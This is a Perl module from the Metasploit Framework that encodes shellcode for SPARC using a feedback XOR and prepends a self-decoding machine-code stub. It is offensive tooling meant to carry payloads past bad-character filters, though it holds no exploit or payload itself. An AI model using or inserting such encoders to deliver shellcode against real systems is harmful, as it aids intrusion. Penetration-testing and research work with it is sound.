
#
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Encoder::Sparc;
use strict;
use base 'Msf::Encoder';
use Pex::Encoding::XorDwordFeedbackN;
use Pex::SPARC;

my $advanced = 
{

};

my $info = {
    'Name'    => 'Sparc DWord Xor Encoder',
    'Version' => '$Revision$',
    'Authors' => [ 'optyx <optyx@uberhax0r.net>' ],
    'Arch'    => [ 'sparc' ],
    'OS'      => [ ],
    'Description'  =>  "<optyx> fucking xor decoder 48 bytes, cache safe",
    'Refs'    => [ ],
};

sub new {
    my $class = shift; 
    return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
}

sub EncodePayload {
    my $self     = shift;
    my $payload  = shift;
    my $badchars = shift;


    my $xor_key = Pex::Encoding::XorDwordFeedbackN->KeyScan($payload, $badchars);
    if(!$xor_key) {
        $self->PrintDebugLine(3, 'Failed to find xor key');
        return;                                            
    }

    # Check for a null dword in the payload first, this will break the decoder
    my $check = $payload;
    while (length($check)) {
    	my $word = substr($check, 0, 4);
        if ($word eq pack('N', 0)) {
        	$self->PrintLine("[*] Sparc decoder is not able to handle null dwords in the payload");
        	return;
        }  
        $check = substr($check, 4);
    }

    # Append a null to the payload, this becomes the end tag
    $payload .= pack('N', 0);
    my $xor_data = Pex::Encoding::XorDwordFeedbackN->Encode($xor_key, $payload);

    # Flip the key endian-ness
    $xor_key = unpack('V', pack('N', $xor_key));

    my $encoder = 
        "\x20\xbf\xff\xff".   # /* bn,a  _start - 4 */
        "\x20\xbf\xff\xff".   # /* bn,a  _start     */
        "\x7f\xff\xff\xff".   # /* call  _start + 4 */
	Pex::SPARC::set($xor_key, "l7").
        "\xea\x03\xe0\x28".   # /* ld    [%o7 + 0x28],%l7 */
        "\xaa\x9d\x40\x17".   # /* xorcc %l5,%l7,%l5 */
        "\xea\x23\xe0\x28".   # /* st    %l5,[%o7 + 0x28] */
        "\xae\x05\xc0\x15".   # /* add   %l7,%l5,%l7 */
        "\x81\xdb\xe0\x28".   # /* flush %o7 + 0x28 */
        "\x12\xbf\xff\xfb".   # /* bnz   dec_loop */
        "\x9e\x03\xe0\x04";   # /* add   %o7,4,%o7 */
    
    # XXX - We do not check to see if the split bitshifted key is a badchar!
    return $encoder . $xor_data;
}

1;
